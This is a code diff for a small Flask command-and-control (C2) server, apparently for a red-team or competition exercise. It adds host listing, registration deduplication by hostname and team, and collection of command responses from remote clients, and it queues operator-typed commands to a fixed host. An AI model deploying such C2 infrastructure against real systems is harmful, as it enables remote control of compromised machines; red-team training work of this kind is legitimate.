@@ -30,12 +30,15 @@ def homePage():
     return "Homepage of C2"
 
 
-@app.route("/hosts/")
+@app.route("/hosts")
 def hostsPage():
     """
     Returns a list of current hosts
     """
-    return "Host1\nHost2\nHost3"
+    hostString = ""
+    for host in HOSTS:
+        hostString+=host + "\n"
+    return hostString
 
 @app.route("/hosts/<identifier>/commands")
 def getCommands(identifier):
@@ -49,6 +52,11 @@ def getResponse(identifier):
     """
     Accepts a POST request for the client to send responses to
     """
+    data = request.get_json()
+    cmd_id = data["cmd_id"]
+    response = data["response"]
+    HOSTS[identifier].addResponse(cmd_id,response)
+    print(f"[SERVER] Host ({identifier}) - {cmd_id}: {response}")
     return f"{identifier} - Thanks!"
 
 @app.route("/hosts/newHost", methods=["POST"])
@@ -61,6 +69,9 @@ def newHost():
     OS = data["OS"]
     hostname = getHostnameByIP(IP)
     team = getTeamByIP(IP)
+    expectedHostname = hostname + "." + team
+    if expectedHostname in HOSTS:
+        return f"{expectedHostname}"
     host = Host(IP,OS,hostname,team)
     if hostname != "unknown":
         HOSTNAMES[hostname].activeHosts.append(host)
@@ -70,7 +81,7 @@ def newHost():
         UNKNOWN_COUNT += 1
         host.id += str(UNKNOWN_COUNT)
     HOSTS[host.id] = host
-    return f"HOSTNAME = {host.id}"
+    return f"{host.id}"
 
 def getHostnameByIP(IP):
     for host in HOSTNAMES: #Iterate over expected hosts
@@ -135,7 +146,7 @@ def main():
     website.start()
     while 1:
         command = input("Enter a command: ")
-        HOSTS["unknown.unknown1"].addCommand(command)
+        HOSTS["Ubuntu1.1"].addCommand(command)
 
 if __name__ == "__main__":
     main()
